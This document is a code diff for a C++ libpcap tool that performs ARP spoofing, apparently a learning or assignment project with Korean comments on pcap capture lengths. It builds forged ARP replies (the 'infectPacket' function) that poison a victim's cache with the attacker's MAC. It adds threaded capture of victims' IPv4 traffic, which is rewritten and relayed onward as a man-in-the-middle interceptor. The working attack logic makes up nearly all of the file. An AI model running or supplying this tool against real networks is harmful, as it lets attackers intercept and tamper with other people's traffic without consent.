@@ -7,9 +7,7 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#include "ethhdr.h"
 #include "iphdr.h"
-
 #include "send.h"
 
 #pragma pack(push, 1)
@@ -62,13 +60,11 @@ EthArpPacket EthArpPacket::broadcastPacket(Mac attackerMac, Ip attackerIp, Ip de
 
     packet.eth_.smac_ = attackerMac;
     packet.eth_.dmac_ = Mac::broadcastMac();
-
     packet.arp_.op_ = htons(ArpHdr::Request);
-    packet.arp_.sip_ = attackerIp;
+    packet.arp_.sip_ = htonl(attackerIp);
     packet.arp_.smac_ = attackerMac;
-    packet.arp_.tip_ = destIp;
+    packet.arp_.tip_ = htonl(destIp);
     packet.arp_.tmac_ = Mac::nullMac();
-
     return packet;
 }
 
@@ -78,13 +74,11 @@ EthArpPacket EthArpPacket::infectPacket(Mac attackerMac, Mac senderMac, Ip sende
 
     packet.eth_.smac_ = attackerMac;
     packet.eth_.dmac_ = senderMac;
-
     packet.arp_.op_ = htons(ArpHdr::Reply);
-    packet.arp_.sip_ = targetIp;
+    packet.arp_.sip_ = htonl(targetIp);
     packet.arp_.smac_ = attackerMac;
-    packet.arp_.tip_ = senderIp;
+    packet.arp_.tip_ = htonl(senderIp);
     packet.arp_.tmac_ = senderMac;
-
     return packet;
 }
 
@@ -117,57 +111,103 @@ Mac receiveArpReply(pcap_t *handle, Ip ip_from, int *receivedFlag)
     }
 }
 
-#define MAX_REGISTER 10
 #include <set>
 #include <map>
 #include <queue>
 
-// std::set<Ip> listeningIps;
-std::map<Ip, std::queue<u_char *>> pipeIp;
-std::map<Ip, pthread_cond_t *> condIp;
-std::map<Ip, pthread_mutex_t *> mutexIp;
+// by src mac
+std::map<Mac, std::queue<u_char *>> pipeByMac;
+std::map<Mac, pthread_cond_t *> condByMac;
+std::map<Mac, pthread_mutex_t *> mutexByMac;
 
-pthread_mutex_t mutex;
-pthread_cond_t cond;
-
-u_char *getNextPcap(pcap_t *handle)
+void *producePacket(void *param)
 {
+    ProduceParam *p = (ProduceParam *)param;
+    struct pcap_pkthdr *header;
+    const u_char *packet;
     while (true)
     {
-        struct pcap_pkthdr *header;
-        const u_char *packet;
-        int res = pcap_next_ex(handle, &header, &packet);
+        int res = pcap_next_ex(p->handle, &header, &packet);
         if (res == 0)
             continue;
-        return const_cast<u_char *>(packet);
+        EthHdr *temp = (EthHdr *)packet;
+        if (temp->type() != EthHdr::Ip4)
+            continue;
+        // if (temp->dmac() != p->attackerMac)
+        //     continue;
+        Mac srcMac = temp->smac();
+        if (pipeByMac.find(srcMac) == pipeByMac.end())
+            continue;
+
+        u_char *product = (u_char *)malloc(sizeof(u_char) * header->len);
+        memcpy(product, packet, header->len);
+        pthread_cond_t *cond = condByMac[srcMac];
+        pthread_mutex_t *mutex = mutexByMac[srcMac];
+        pthread_mutex_lock(mutex);
+        pipeByMac[srcMac].push(product);
+        printf("produce %s len %d\n", std::string(srcMac).c_str(), header->caplen);
+        pthread_cond_signal(cond);
+        pthread_mutex_unlock(mutex);
     }
 }
-// pthread lock at pcap_next_ex??
 
-void *producePacket(void *handle) // pcap_t
+void registerMac(Mac mac, pthread_cond_t *cond, pthread_mutex_t *mutex)
 {
+    if (pipeByMac.find(mac) == pipeByMac.end())
+    {
+        pipeByMac[mac] = std::queue<u_char *>();
+        condByMac[mac] = cond;
+        mutexByMac[mac] = mutex;
+    }
+}
+
+u_char *consumePacketBySrcMac(Mac mac)
+{
+    pthread_cond_t *cond = condByMac[mac];
+    pthread_mutex_t *mutex = mutexByMac[mac];
+    pthread_mutex_lock(mutex);
+    if (pipeByMac[mac].size() == 0)
+    {
+        pthread_cond_wait(cond, mutex);
+    }
+    u_char *v = pipeByMac[mac].front();
+    pipeByMac[mac].pop();
+    pthread_mutex_unlock(mutex);
+    return v;
+}
+
+void relay(pcap_t *handle, u_char *packet, int len)
+{
+    EthIpPacket *payload = (EthIpPacket *)packet;
+    printf("relay %s -> %s\n", std::string(payload->eth_.smac()).c_str(), std::string(payload->eth_.dmac()).c_str());
+    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet), len);
+    if (res != 0)
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+}
+
+void *spoof(void *param)
+{
+    SpoofParams *s = (SpoofParams *)param;
     while (true)
     {
-        u_char *packet = getNextPcap((pcap_t *)handle);
-        EthHdr *temp = (EthHdr *)packet;
-        if (ntohs(temp->type_) == 0x0800)
-        {
-            pthread_mutex_lock(&mutex);
-            EthIpPacket *tempip = (EthIpPacket *)packet;
-            pipeIp[tempip->ip_.dip_.ntoh()].push(packet);
-            pthread_cond_signal(&cond);
-            pthread_mutex_unlock(&mutex);
-        }
-        else if (ntohs(temp->type_) == 0x0806)
-        {
-            pthread_mutex_lock(&mutex);
-            EthArpPacket *temparp = (EthArpPacket *)packet;
-            pipeIp[temparp->arp_.tip_.ntoh()].push(packet);
-            pthread_cond_signal(&cond);
-            pthread_mutex_unlock(&mutex);
-        }
+        u_char *packet = consumePacketBySrcMac(s->smac);
+        EthIpPacket *payload = (EthIpPacket *)packet;
+        int len = payload->ip_.len() + 14;
+        printf("packet consume length %d\n", len);
+        payload->eth_.smac_ = s->amac;
+        payload->eth_.dmac_ = s->dmac;
+        relay(s->handle, packet, len);
+        free(packet);
     }
 }
+
+// unused
+//  std::set<Ip> ips;
+//  void registerIp(Ip ip)
+//  {
+//      ips.insert(ip);
+//  }
+
 // register mutex and cond on queue?
 
 // thread 1 : pthread_mutex_lock(&mutex);
@@ -181,51 +221,7 @@ void *producePacket(void *handle) // pcap_t
 // pthread_cond_signal(&cond);
 // pthread_mutex_unlock(&mutex);
 
-void registerIp(Ip ip, pthread_cond_t *cond, pthread_mutex_t *mutex)
-{
-    if (pipeIp.find(ip) == pipeIp.end())
-    {
-        pipeIp[ip] = std::queue<u_char *>();
-
-        // mutex cond
-        condIp[ip] = cond;
-        mutexIp[ip] = mutex;
-    }
-}
-
-u_char *consumePacketByDestIp(Ip ip)
-{
-    pthread_cond_t *cond = condIp[ip];
-    pthread_mutex_t *mutex = mutexIp[ip];
-    pthread_mutex_lock(mutex);
-    if (pipeIp[ip].size() == 0)
-    {
-        pthread_cond_wait(cond, mutex);
-    }
-    u_char *v = pipeIp[ip].front();
-    pipeIp[ip].pop();
-    pthread_mutex_unlock(mutex);
-    return v;
-}
-
-void relay(pcap_t *handle, EthIpPacket *packet)
-{
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(packet), sizeof(packet));
-    if (res != 0)
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-}
-// pcap_sendpacket may need another mutex
-// no need for cond
-
-void spoof(pcap_t *handle, Ip destIp, Mac atkMac, Mac destMac) // pcap_t *handle, Mac atkMac, Ip destIp, Mac destMac
-{
-    while (true)
-    {
-        u_char *packet = consumePacketByDestIp(destIp);
-        EthIpPacket *payload = (EthIpPacket *)packet;
-        payload->eth_.smac_ = atkMac;
-        payload->eth_.dmac_ = destMac;
-        relay(handle, payload);
-        printf("packet from %s to %s len %u", std::string(payload->ip_.sip()).c_str(), std::string(payload->ip_.dip()).c_str(), payload->ip_.len());
-    }
-}
+// packet을 받기전에 앞으로 받을 packet의 최대 길이를 설정할 수 있다는 것 같습니다.
+// 예를 들면, pcap은 packet 단위로 데이터를 가져다 주는데 이번에 들어온 packet은 길이가 100입니다.
+// 그런데 처음에 한 번에 읽을 최대 길이를 60으로 설정했다면
+// 실제 읽은 데이터 길이 (caplen) 은 60이 되고 capture한 packet의 실제 길이 (len)은 100이 됩니다.
